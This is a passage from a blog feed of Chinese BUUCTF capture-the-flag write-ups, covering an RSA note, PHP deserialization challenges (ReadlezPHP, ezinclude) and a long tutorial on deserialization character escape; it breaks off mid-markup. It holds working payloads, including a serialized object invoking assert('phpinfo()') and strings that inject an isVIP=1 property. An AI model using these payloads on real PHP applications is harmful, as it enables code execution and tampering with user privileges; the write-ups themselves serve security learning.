(((mp-mq)*I)%p)*q+mq       <span class="comment">#求明文公式</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m))          <span class="comment">#转为十六进制</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><h2 id="权限获得第一步"><a href="#权限获得第一步" class="headerlink" title="权限获得第一步"></a>权限获得第一步</h2><p>win密码<br>md5</p>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-WEB-[NPUCTF2020]ReadlezPHP-简单反序列化</title>
      <link href="/2022/03/29/BUUCTF-WEB-NPUCTF2020-ReadlezPHP-%E7%AE%80%E5%8D%95%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2022/03/29/BUUCTF-WEB-NPUCTF2020-ReadlezPHP-%E7%AE%80%E5%8D%95%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="找到源码"><a href="#找到源码" class="headerlink" title="找到源码"></a>找到源码</h2><p>手动view-source:url查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>可以看到，很明显的动态函数利用<br>试了序列化phpinfo，但是显示得很少，用system函数还有exec函数都不能用，<br>看了WP，用的assert</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;</span><br></pre></td></tr></table></figure><p>flag在phpinfo里面，同时看到function_disabled，禁了很多</p>]]></content>
      
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-WEB-[NPUCTF2020]ezinclude-利用session文件包含</title>
      <link href="/2022/03/29/BUUCTF-WEB-NPUCTF2020-ezinclude-%E5%88%A9%E7%94%A8session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2022/03/29/BUUCTF-WEB-NPUCTF2020-ezinclude-%E5%88%A9%E7%94%A8session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<p>主要是两个方法：</p><p>方法一 利用php7 segment fault特性（CVE-2018-14884）<br>方法二 利用 session.upload_progress 进行 session 文件包含<br>参考：</p><p><a href="https://www.freebuf.com/vuls/202819.html">利用session.upload_progress进行文件包含和反序列化渗透</a><br><a href="https://zhuanlan.zhihu.com/p/422556341">[NPUCTF2020]ezinclude</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-MISIC-刷题笔记 02</title>
      <link href="/2022/03/28/BUUCTF-MISIC-%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-02/"/>
      <url>/2022/03/28/BUUCTF-MISIC-%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-02/</url>
      
        <content type="html"><![CDATA[<h2 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h2><p>winhex 打开有PK也就是zip压缩标志，改后缀解压得俩文件，一个base64解密发现有句话<br>What is Nicki Minaj’s favorite song that refers to snakes?<br>搜一下，出来WP。哈哈哈</p><p>回到正题，找到这个歌手，然后发现它关于🐍的歌，是Anaconda，然后别忘了还有一个文件，我们联想到serpent加密（怎么联想？看WP，逃），在线解密<br><a href="http://serpent.online-domain-tools.com/">Serpent – Symmetric Ciphers Online</a><br>，key是anaconda，哎，为什么首字母小写，哎，不知道。</p><h2 id="BJDCTF2020认真你就输"><a href="#BJDCTF2020认真你就输" class="headerlink" title="BJDCTF2020认真你就输"></a>BJDCTF2020认真你就输</h2>]]></content>
      
      
      
        <tags>
            
            <tag> MISIC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-WEB-[安洵杯 2019]easy_serialize_php-反序列化字符逃逸-exract变量覆盖</title>
      <link href="/2022/03/27/BUUCTF-WEB-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8-extract%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"/>
      <url>/2022/03/27/BUUCTF-WEB-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8-extract%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是发序列化字符逃逸？"><a href="#什么是发序列化字符逃逸？" class="headerlink" title="什么是发序列化字符逃逸？"></a>什么是发序列化字符逃逸？</h2><p>参考（侵删，逃）：<br><a href="https://www.freebuf.com/articles/web/285985.html">PHP反序列化字符逃逸详解</a></p><p>当开发者使用先将对象序列化，然后将对象中的字符进行过滤，最后再进行反序列化。这个时候就有可能会产生PHP反序列化字符逃逸的漏洞。<br>换句话说，过滤替换反序列化后的字符串，导致导致反序列化结构破坏，进而可以改变原有属性，造成漏洞。举例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br><span class="line">加入过滤asmin为hacker则变成</span><br><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br><span class="line">可以看到username的长度仍是5而实际是6</span><br></pre></td></tr></table></figure><p>怎么利用呢？<br>一般分为两种，替换后字符串变长&#x2F;变短</p><h3 id="具体举例（题解在后面，可跳过）"><a href="#具体举例（题解在后面，可跳过）" class="headerlink" title="具体举例（题解在后面，可跳过）"></a>具体举例（题解在后面，可跳过）</h3><p>假设我们先定义一个user类，然后里面一共有3个成员变量：username、password、isVIP。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到当这个类被初始化的时候，isVIP变量默认是0，并且不受初始化传入的参数影响。</p><p>接下来把完整代码贴出来，便于我们分析。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">user</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line">​</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这一段程序的输出结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure><p>可以看到，对象序列化之后的isVIP变量是0。</p><p>这个时候我们增加一个函数，用于对admin字符进行替换，将admin替换为hacker，替换函数如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此整段程序如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">user</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line">​</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这一段程序的输出为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure><p>这个时候我们把这两个程序的输出拿出来对比一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;  //未过滤</span><br><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125; //已过滤</span><br></pre></td></tr></table></figure><p>可以看到已过滤字符串中的hacker与前面的字符长度不对应了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s:5:&quot;admin&quot;;</span><br><span class="line">s:5:&quot;hacker&quot;;</span><br></pre></td></tr></table></figure><p>在这个时候，对于我们，在新建对象的时候，传入的admin就是我们的可控变量</p><p>接下来明确我们的目标：将isVIP变量的值修改为1</p><p>首先我们将我们的现有子串和目标子串进行对比：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;//现有子串</span><br><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;//目标子串</span><br></pre></td></tr></table></figure><p>也就是说，我们要在admin这个可控变量的位置，注入我们的目标子串。</p><p>首先计算我们需要注入的目标子串的长度：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</span><br><span class="line">//以上字符串的长度为47</span><br></pre></td></tr></table></figure><p>因为我们需要逃逸的字符串长度为47，并且admin每次过滤之后都会变成hacker，也就是说每出现一次admin，就会多1个字符。</p><p>因此我们在可控变量处，重复47遍admin，然后加上我们逃逸后的目标子串，可控变量修改如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure><p>完整代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">user</span>(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>程序输出结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure><p>我们可以数一下hacker的数量，一共是47个hacker，共282个字符，正好与前面282相对应。</p><p>后面的注入子串也正好完成了逃逸。</p><p>反序列化后，多余的子串会被抛弃</p><p>我们接着将这个序列化结果反序列化，然后将其输出，完整代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">user</span>(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"><span class="variable">$a_seri_filter_unseri</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a_seri_filter</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a_seri_filter_unseri</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>程序输出如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">object(user)#2 (3) &#123;</span><br><span class="line">[&quot;username&quot;]=&gt;</span><br><span class="line">string(282) &quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span><br><span class="line">[&quot;password&quot;]=&gt;</span><br><span class="line">string(6) &quot;123456&quot;</span><br><span class="line">[&quot;isVIP&quot;]=&gt;</span><br><span class="line">int(1)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个时候，isVIP这个变量就变成了1，反序列化字符逃逸的目的也就达到了。</p><p>过滤后字符变少<br>上面描述了PHP反序列化字符逃逸中字符变多的情况。</p><p>以下开始解释反序列化字符逃逸变少的情况。</p><p>首先，和上面的主体代码还是一样，还是同一个class，与之有区别的是过滤函数中，我们将hacker修改为hack。</p><p>完整代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">user</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 